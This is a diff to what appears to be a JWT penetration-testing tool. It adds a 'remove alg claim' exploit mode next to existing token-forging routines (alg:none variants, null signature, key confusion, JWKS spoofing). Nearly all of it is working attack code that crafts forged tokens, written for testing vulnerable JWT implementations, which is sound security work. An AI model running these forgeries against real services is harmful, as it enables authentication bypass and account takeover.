@@ -471,9 +471,9 @@ def checkNullSig(contents):
 
 
 def checkAlgNone(headDict, paylB64):
-    alg1 = "none"
-    newHead1 = buildHead(alg1, headDict)
-    CVEToken0 = newHead1 + "." + paylB64 + "."
+    alg = "none"
+    newHead = buildHead(alg, headDict)
+    CVEToken0 = newHead + "." + paylB64 + "."
     alg = "None"
     newHead = buildHead(alg, headDict)
     CVEToken1 = newHead + "." + paylB64 + "."
@@ -484,6 +484,14 @@ def checkAlgNone(headDict, paylB64):
     newHead = buildHead(alg, headDict)
     CVEToken3 = newHead + "." + paylB64 + "."
     return [CVEToken0, CVEToken1, CVEToken2, CVEToken3]
+
+
+def checkRemoveAlgClaim(headDict, paylB64, sig):
+    alg = ""
+    newHead = headDict.pop("alg", None)
+    newHead = buildHead(alg, headDict)
+    newContent = newHead + "." + paylB64 + "." + sig
+    return newContent
 
 
 def checkPubKeyExploit(headDict, paylB64, pubKey):
@@ -1844,12 +1852,20 @@ def scanModePlaybook():
     zippedToks = dict(
         zip(noneToks, ['"alg":"none"', '"alg":"None"', '"alg":"NONE"', '"alg":"nOnE"'])
     )
+
     for noneTok in zippedToks:
         jwtOut(
             noneTok,
             "Exploit: " + zippedToks[noneTok] + " (-X a)",
             "Testing whether the None algorithm is accepted - which allows forging unsigned tokens",
         )
+    # Exploit: Remove alg claim
+    removeAlgClaim = checkRemoveAlgClaim(headDict, paylB64, sig)
+    jwtOut(
+        removeAlgClaim,
+        "Exploit: Remove alg claim (-X r)",
+        "The algorithm claim will be completely removed from the JWT header",
+    )
     # Exploit: key confusion - use provided PubKey
     if config["crypto"]["pubkey"]:
         newTok, newSig = checkPubKeyExploit(
@@ -2344,6 +2360,10 @@ def runExploits():
                     + " - this is an exploit targeting the debug feature that allows a token to have no signature\n(This will only be valid on unpatched implementations of JWT.)"
                 )
                 jwtOut(noneTok, "Exploit: " + zippedToks[noneTok], desc)
+        if args.exploit == "r":
+            removeAlgClaim = checkRemoveAlgClaim(headDict, paylB64, sig)
+            desc = "EXPLOIT: The algorithm claim will be completely removed from the JWT header."
+            jwtOut(removeAlgClaim, "EXPLOIT: Remove alg claim", desc)
         elif args.exploit == "n":
             jwtNull = checkNullSig(contents)
             desc = "EXPLOIT: null signature\n(This will only be valid on unpatched implementations of JWT.)"
@@ -2568,7 +2588,7 @@ if __name__ == "__main__":
         "-X",
         "--exploit",
         action="store",
-        help="eXploit known vulnerabilities:\na = alg:none\nn = null signature\nb = blank password accepted in signature\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS",
+        help="eXploit known vulnerabilities:\na = alg:none\nr = remove alg claim\nn = null signature\nb = blank password accepted in signature\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS",
     )
     parser.add_argument(
         "-ju",
@@ -2855,10 +2875,10 @@ if __name__ == "__main__":
         else:
             config["argvals"]["scanMode"] = args.mode
     if args.exploit:
-        if args.exploit not in ["a", "n", "b", "s", "i", "k"]:
+        if args.exploit not in ["a", "r", "n", "b", "s", "i", "k"]:
             parser.print_usage()
             cprintc(
-                "\nPlease choose an exploit (e.g. -X a):\na = alg:none\nn = null signature\nb = blank password accepted in signature\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS",
+                "\nPlease choose an exploit (e.g. -X a):\na = alg:none\nr = remove alg claim\nn = null signature\nb = blank password accepted in signature\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS",
                 "red",
             )
             exit(1)
